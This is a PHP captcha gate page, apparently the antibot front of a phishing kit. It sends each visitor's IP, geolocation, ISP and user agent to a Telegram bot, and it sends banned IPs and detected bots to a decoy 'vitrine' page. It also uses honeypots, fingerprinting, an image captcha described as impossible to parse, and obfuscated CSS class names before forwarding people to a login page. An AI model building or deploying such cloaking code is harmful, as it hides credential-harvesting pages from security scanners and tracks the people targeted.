<?php

if (!defined('ALLOW_INCLUDE')) define('ALLOW_INCLUDE', true);

require_once './modules/sessions.php';
require_once './modules/load_config.php';
require_once './langues/lang_cap.php';

/* ── Notif Telegram : nouveau visiteur dès l'arrivée au captcha ─────────── */
function _captcha_get_ip(): string {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            return trim(explode(',', $_SERVER[$k])[0]);
        }
    }
    return 'UNKNOWN';
}

function _captcha_send_visitor_notif(): void {
    $bot_token     = getConfig('BOT_TOKEN', '');
    $chat_id       = getConfig('CHAT_NOTIF', '');
    $notif_enabled = getConfig('CHAT_NOTIF_ENABLED', '1');

    if ($notif_enabled !== '1' || empty($bot_token) || empty($chat_id)) return;

    $ip = _captcha_get_ip();

    /* Éviter le double-envoi pour la même IP dans la même session (30 min) */
    $sessionKey = 'captcha_notif_sent_' . md5($ip);
    if (!empty($_SESSION[$sessionKey]) && (time() - $_SESSION[$sessionKey]) < 1800) return;
    $_SESSION[$sessionKey] = time();

    /* Géolocalisation légère via ip-api.com (timeout 2s pour ne pas bloquer) */
    $geoData = [];
    $geoCtx = stream_context_create(['http' => ['timeout' => 2]]);
    $geoRaw = @file_get_contents(
        "http://ip-api.com/json/{$ip}?fields=status,country,countryCode,city,regionName,isp,proxy,mobile",
        false, $geoCtx
    );
    if ($geoRaw) $geoData = json_decode($geoRaw, true) ?: [];

    $country    = $geoData['country']      ?? 'UNKNOWN';
    $countryCode= $geoData['countryCode']  ?? '??';
    $city       = $geoData['city']         ?? '';
    $region     = $geoData['regionName']   ?? '';
    $isp        = $geoData['isp']          ?? '';
    $isProxy    = !empty($geoData['proxy']) ? '✅' : '❌';
    $isMobile   = !empty($geoData['mobile']) ? '📱 Mobile' : '🖥️ Desktop';
    $ua         = htmlspecialchars(substr($_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN', 0, 200), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $time       = date('d-m-Y H:i:s');

    $message = "👀 <b>Nouveau visiteur — Captcha</b>\n"
        . "📍 <b>IP :</b> {$ip}\n"
        . "🌍 <b>Pays :</b> {$country} ({$countryCode})\n"
        . "🏙️ <b>Ville :</b> {$city} - {$region}\n"
        . "📶 <b>FAI :</b> {$isp}\n"
        . "📱 <b>Appareil :</b> {$isMobile}\n"
        . "🕵️ <b>Proxy :</b> {$isProxy}\n"
        . "⏰ <b>Heure :</b> {$time}\n"
        . "🧾 <b>UA :</b> {$ua}";

    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage?"
        . http_build_query(['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML']);
    $tgCtx = stream_context_create(['http' => ['timeout' => 3]]);
    @file_get_contents($url, false, $tgCtx);
}

_captcha_send_visitor_notif();

// Obtenir l'IP de l'utilisateur (wrapper vers _captcha_get_ip pour compatibilité)
function getUserIP() {
    return _captcha_get_ip();
}

// 🔒 Fonction de bannissement automatique
function banIP($ip, $reason) {
    $banned_ips_file = './logs/ip_ban.txt';
    $ban_log = './logs/captcha_ban.log';
    
    file_put_contents($banned_ips_file, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    file_put_contents($ban_log, sprintf("[%s] IP: %s | Reason: %s\n", date('Y-m-d H:i:s'), $ip, $reason), FILE_APPEND | LOCK_EX);
    
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    session_unset();
    session_destroy();
    http_response_code(403);
    header('Location: ./pages/ban.php');
    exit;
}

// 🔒 Rate Limiting - Max 3 tentatives par minute
function checkRateLimit($ip) {
    $rate_file = './logs/captcha_attempts.json';
    $max_attempts = 3;
    $time_window = 60; // 1 minute
    
    if (!file_exists($rate_file)) {
        file_put_contents($rate_file, json_encode([]), LOCK_EX);
    }
    
    $attempts = json_decode(file_get_contents($rate_file), true) ?: [];
    $current_time = time();
    
    // Nettoyer les anciennes tentatives
    if (isset($attempts[$ip])) {
        $attempts[$ip] = array_filter($attempts[$ip], function($timestamp) use ($current_time, $time_window) {
            return ($current_time - $timestamp) < $time_window;
        });
    } else {
        $attempts[$ip] = [];
    }
    
    // Vérifier le nombre de tentatives
    if (count($attempts[$ip]) >= $max_attempts) {
        banIP($ip, "Trop de tentatives captcha");
    }
    
    // Ajouter cette tentative
    $attempts[$ip][] = $current_time;
    file_put_contents($rate_file, json_encode($attempts), LOCK_EX);
}

$ip = getUserIP();
$banned_ips_file = './logs/ip_ban.txt';

if (file_exists($banned_ips_file)) {
    $banned_ips = file($banned_ips_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    
    if (in_array($ip, $banned_ips, true)) {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        session_unset();
        session_destroy();
        http_response_code(403);
        header('Location: ./pages/vitrine.php');
        exit('❌ Votre IP est déjà bannie.');
    }
}

$message = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    checkRateLimit($ip); // 🔒 Vérifier le rate limit
    
    // 🔒 VALIDATION 1: Honeypot amélioré
    if (!empty($_POST['website']) || !empty($_POST['email_confirm'])) {
        banIP($ip, "Honeypot rempli");
    }
    
    // 🔒 VALIDATION 2: Token CSRF
    if (!isset($_POST['captcha_token']) || !isset($_SESSION['captcha_token']) || $_POST['captcha_token'] !== $_SESSION['captcha_token']) {
        banIP($ip, "Token CSRF invalide");
    }
    
    // 🔒 VALIDATION 3: Temps de réponse minimum (2 secondes)
    $captcha_start_time = $_SESSION['captcha_start_time'] ?? time();
    $response_time = time() - $captcha_start_time;
    
    if ($response_time < 2) {
        banIP($ip, "Réponse trop rapide ({$response_time}s)");
    }
    
    if ($response_time > 300) { // 5 minutes max
        $message = $tr['captcha']['error_session'];
    } else {
        // 🔒 VALIDATION 4: Challenge JavaScript
        // ✅ MODIFIÉ : Logger au lieu de bannir directement (peut échouer si JS désactivé)
        $jsChallengeValid = true;
        if (!isset($_POST['js_challenge']) || $_POST['js_challenge'] !== $_SESSION['js_challenge_answer']) {
            // Logger l'erreur mais ne pas bloquer - peut être un problème de JavaScript
            error_log("Captcha: Challenge JavaScript échoué pour IP: $ip");
            $jsChallengeValid = false;
            // Ne pas bannir, juste logger pour éviter les faux positifs
        }
        
        // 🔒 VALIDATION 5: Empreinte navigateur (optionnelle, juste logger)
        if (!isset($_POST['browser_fp']) || empty($_POST['browser_fp'])) {
            error_log("Captcha: Empreinte navigateur manquante pour IP: $ip");
            // Ne pas bloquer, juste logger
        }
        
        // 🔒 VALIDATION 6: Vérifier l'Accept header (optionnelle)
        $accept_header = $_SERVER['HTTP_ACCEPT'] ?? '';
        if (strpos($accept_header, 'text/html') === false && strpos($accept_header, '*/*') === false) {
            error_log("Captcha: Accept header suspect pour IP: $ip - Header: $accept_header");
            // Ne pas bloquer, juste logger (certains navigateurs peuvent avoir des headers différents)
        }
        
        // ✅ Validation du captcha - TOUJOURS effectuée même si certaines validations optionnelles échouent
        if (isset($_POST['jCaptcha'])) {
            $reponse = (int)$_POST['jCaptcha'];
            $resultat_attendu = $_SESSION['captcha_resultat'] ?? null;

            if ($resultat_attendu !== null && $reponse === $resultat_attendu) {
                // ✅ Si le challenge JS a échoué, logger mais autoriser quand même si le captcha est correct
                if (!$jsChallengeValid) {
                    error_log("Captcha: Challenge JS échoué mais captcha correct pour IP: $ip - Autorisation accordée");
                }
                
                // ✅ Définir la validation du captcha
                $_SESSION['captcha_valide'] = true;
                
                // ✅ SÉCURITÉ : Enregistrer l'IP qui a passé le captcha
                $_SESSION['captcha_ip'] = $ip;
                
                // Nettoyer les données de session
                unset($_SESSION['captcha_resultat']);
                unset($_SESSION['captcha_token']);
                unset($_SESSION['captcha_start_time']);
                unset($_SESSION['js_challenge_answer']);
                
                // ✅ SÉCURITÉ : Forcer l'écriture de la session avant la redirection
                if (session_status() === PHP_SESSION_ACTIVE) {
                    session_write_close();
                }
                
                // Rediriger vers la page de login (première page du site)
                header('Location: ./pages/index.php');
                exit;
            } else {
                $message = $tr['captcha']['error_incorrect'];
            }
        } else {
            $message = $tr['captcha']['error_fill'];
        }
    }
}

// 🔒 Générer un token CSRF unique
$csrf_token = bin2hex(random_bytes(32));
$_SESSION['captcha_token'] = $csrf_token;
$_SESSION['captcha_start_time'] = time();

// 🔒 Générer un challenge JavaScript aléatoire
$js_challenge_value = rand(100, 999);
$_SESSION['js_challenge_answer'] = hash('sha256', $js_challenge_value . 'secret_salt_' . $csrf_token);

// Génère un nouveau captcha
$valeur1 = rand(1, 10);
$valeur2 = rand(1, 10);
$_SESSION['captcha_resultat'] = $valeur1 + $valeur2;

// 🔒 Générer l'ID unique pour l'image captcha
$captcha_id = uniqid('cap_', true);
$_SESSION['captcha_id'] = $captcha_id;
?>


<html>
<link rel="icon" type="image/x-icon" sizes="32x32" href="./assets/img/favicon.ico">
<meta charset=utf-8>
<title class=sf-hidden><?= htmlspecialchars($tr['captcha']['title']) ?></title>
<meta name=viewport content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name=referrer content=no-referrer>





<style>
    .sf-hidden {
        display: none !important
    }
</style>
<link rel=canonical href=>

<body bis_register=W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMiIsInNjb3JlIjoyMDAyMn1d __processed_99adec6f-3744-4f87-8d70-496e09e475f3__=true cz-shortcut-listen=true>
    <div bis_skin_checked=1>




        <style class=sf-hidden>
            * {
                box-sizing: border-box;
                font-family: system-ui
            }

            body {
                background: #eef2f8;
                display: flex;
                align-items: center;
                justify-content: center;
                height: calc(100vh - 200px)
            }

            main p {
                width: 80%;
                margin: auto;
                text-align: center;
                display: block;
                margin-bottom: 40px;
                font-weight: 400;
                font-size: 15px;
                font-family: system-ui, sans-serif
            }

            #ofVAvTSizy {
                width: 490px;
                margin-top: -100px;
                display: flex;
                align-items: center;
                flex-direction: column
            }

            .ugnzXRAqYJ {
                margin-top: 30px;
                position: relative;
                display: flex
            }

            .hVLwluEBoq {
                position: absolute;
                top: -30px
            }

            .DQpAxwUjcV {
                padding: 20px 25px 20px 20px;
                font-size: 15px;
                width: 320px;
                height: 60px;
                box-sizing: border-box;
                outline: none;
                border-radius: 4px 0 0 4px;
                vertical-align: middle;
                border: 1px solid #bebebe;
                transition: 0.2s
            }

            .FnsRDUTOgp {
                padding: 21px 0;
                width: 54px;
                height: 60px;
                vertical-align: middle;
                box-sizing: border-box;
                font-weight: bold;
                background: #1537AA;
                cursor: pointer;
                border: none;
                line-height: 1;
                text-transform: uppercase;
                border-radius: 0 4px 4px 0;
                margin-left: -4px;
                font-family: system-ui;
                font-size: 14px;
                letter-spacing: 0.5px;
                transition: all 150ms linear;
                outline: none;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #ffe4e4
            }

            .FnsRDUTOgp:hover,
            .FnsRDUTOgp:focus {
                background: #1537AA
            }

            #TFacuBgxrO {
                font-size: 14px;
                margin-top: 22px;
                background: white;
                padding: 18px;
                border-radius: 7px;
                color: #1d1d1d;
                width: 76%
            }

            #vYXZPbjVqN {
                display: block;
                margin: auto;
                margin-bottom: 30px;
                width: 170px;
                transform: scale(1);
                transition: transform 0.2s ease-in-out;
                animation: growLogo 0.4s infinite alternate
            }

            @keyframes growLogo {
                0% {
                    transform: scale(1)
                }

                100% {
                    transform: scale(1.05)
                }
            }

            .icon-chevron-right {
                box-sizing: border-box;
                position: relative;
                display: block;
                transform: scale(var(--ggs, 1));
                width: 22px;
                height: 22px;
                border: 2px solid;
                border-radius: 100px
            }

            .icon-chevron-right::after {
                content: "";
                display: block;
                box-sizing: border-box;
                position: absolute;
                width: 6px;
                height: 6px;
                border-bottom: 2px solid;
                border-right: 2px solid;
                transform: rotate(-45deg);
                left: 5px;
                top: 6px
            }

            @media screen and (max-width:540px) {
                #ofVAvTSizy {
                    width: 96%;
                    margin-top: 40px
                }

                .ugnzXRAqYJ {
                    display: flex;
                    width: 87%
                }

                .DQpAxwUjcV {
                    width: 86%;
                    height: 50px
                }

                .FnsRDUTOgp {
                    height: 50px;
                    padding: 18px 0
                }

                #TFacuBgxrO {
                    width: 87%
                }
            }
        </style>
        
   
  </header>
        <main id=ofVAvTSizy data-date="1999-12-27 01:09:13">

        <!-- logo -->
         <br><br><br><br><br><br><br><br>
           <img src="./assets/img/capchat.svg" width="150">
            <br>

            <p><?= htmlspecialchars($tr['captcha']['description']) ?></p>
<!-- 🔒 IMAGE CAPTCHA (impossible à parser en HTML) -->
<div style="text-align: center; margin-bottom: 15px;">
        <img src="./assets/captcha_image.php?id=<?= urlencode($captcha_id) ?>" alt="Captcha" style="border: 1.5px solid #1537AA; border-radius: 5px; padding: 10px; background: white;">
    </div>

<form class="ugnzXRAqYJ" method="POST" action="" id="captchaForm">
    <canvas class="hVLwluEBoq" width="100" height="18"></canvas>
    
    
    <br>
    
    <input data-date="2004-02-07 06:14:32" class="jCaptcha DQpAxwUjcV" type="tel" name="jCaptcha" placeholder="<?= htmlspecialchars($tr['captcha']['placeholder']) ?>" required autocomplete="off" maxlength="3">

    <!-- 🔒 CSRF Token -->
    <input type="hidden" name="captcha_token" value="<?= htmlspecialchars($csrf_token) ?>">
    
    <!-- 🔒 JavaScript Challenge -->
    <input type="hidden" name="js_challenge" id="js_challenge">
    
    <!-- 🔒 Browser Fingerprint -->
    <input type="hidden" name="browser_fp" id="browser_fp">

    <!-- 🔒 Honeypots INVISIBLES (nom de champs légitimes) -->
    <input type="text" name="website" id="website" value="" style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1" autocomplete="off">
    <input type="email" name="email_confirm" id="email_confirm" value="" style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1" autocomplete="off">

    <button data-date="1993-09-13 09:13:38" class="FnsRDUTOgp" type="submit" id="submitBtn">
        <i class="icon-chevron-right"></i>
    </button>
</form>

<script>
// 🔒 JavaScript Challenge - Calculer le hash côté client
(function() {
    const challengeValue = <?= $js_challenge_value ?>;
    const token = '<?= $csrf_token ?>';
    
    // Fonction de hachage SHA-256 simple
    async function sha256(message) {
        const msgBuffer = new TextEncoder().encode(message);
        const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }
    
    // Calculer le challenge au chargement
    sha256(challengeValue + 'secret_salt_' + token).then(hash => {
        document.getElementById('js_challenge').value = hash;
    });
    
    // 🔒 Générer une empreinte digitale du navigateur
    function generateFingerprint() {
        const data = [
            navigator.userAgent,
            navigator.language,
            screen.width + 'x' + screen.height,
            screen.colorDepth,
            new Date().getTimezoneOffset(),
            !!window.sessionStorage,
            !!window.localStorage,
            navigator.hardwareConcurrency || 'unknown',
            navigator.platform
        ].join('|');
        
        // Hash simple de l'empreinte
        let hash = 0;
        for (let i = 0; i < data.length; i++) {
            const char = data.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }
    
    document.getElementById('browser_fp').value = generateFingerprint();
    
    // 🔒 Vérifier que le formulaire n'est pas soumis trop vite (minimum 2 secondes)
    const formStartTime = Date.now();
    document.getElementById('captchaForm').addEventListener('submit', function(e) {
        const elapsed = (Date.now() - formStartTime) / 1000;
        if (elapsed < 2) {
            e.preventDefault();
            alert('<?= addslashes($tr['captcha']['error_time']) ?>');
            return false;
        }
    });
    
    // 🔒 Désactiver le bouton pendant 2 secondes
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.5';
    submitBtn.style.cursor = 'not-allowed';
    
    setTimeout(function() {
        submitBtn.disabled = false;
        submitBtn.style.opacity = '1';
        submitBtn.style.cursor = 'pointer';
    }, 2000);
})();
</script>

<?php if ($message !== ""): ?>
    <p style="color:red; margin-top: 10px;"><?= htmlspecialchars($message) ?></p>
<?php endif; ?>

<p data-date="1985-11-30 17:04:47" id="TFacuBgxrO">
    <?= htmlspecialchars($tr['captcha']['protection_text']) ?>
</p>


</body>